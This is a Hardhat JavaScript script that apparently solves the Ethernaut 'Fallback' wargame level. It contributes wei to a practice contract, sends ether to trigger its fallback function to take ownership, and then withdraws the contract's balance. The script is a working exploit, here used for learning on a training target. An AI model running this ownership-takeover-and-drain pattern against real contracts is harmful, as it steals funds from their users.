// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const MyContract = await ethers.getContractFactory("Fallback");
  const contract = await MyContract.attach(
    "0xBb933C5a6a65f368213f3d9d3214E2224a8381F6" // This is the contract address that you get from starting your instance
  );

  console.log("Fallback contract address is", contract.address);

  // You can check that we are not the owner initially
  const owner1 = await contract.owner();
  console.log("The owner initially is", owner1);

  // First we have to contribute so that the require statements can be passed in the fallback function
  const balance1 = await contract.getContribution();
  console.log("Your balance before contributing is", balance1.toString());
  const tx1 = await contract.contribute({ value: 100 }); // we contribute with 100 wei
  const tx1Receipt = await tx1.wait(1);
  const balance2 = await contract.getContribution();
  console.log("Your balance after contributing is", balance2.toString());

  // Then we can call the fallback function by sending ether. This will make us the owner of the contract
  const [owner, addr1] = await ethers.getSigners();
  const tx2 = await owner.sendTransaction({
    to: contract.address,
    value: 100, // Sends 100 wei ethers.utils.parseEther("1.0") sends exactly 1.0 ether
  });
  const tx2Receipt = await tx2.wait(1);

  // Verify you are the new owner
  const owner2 = await contract.owner();
  console.log("The final owner should be you", owner2);

  // Now that we are the owner, we can withdraw the money from the contract and submit the instance after it
  await contract.withdraw();
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
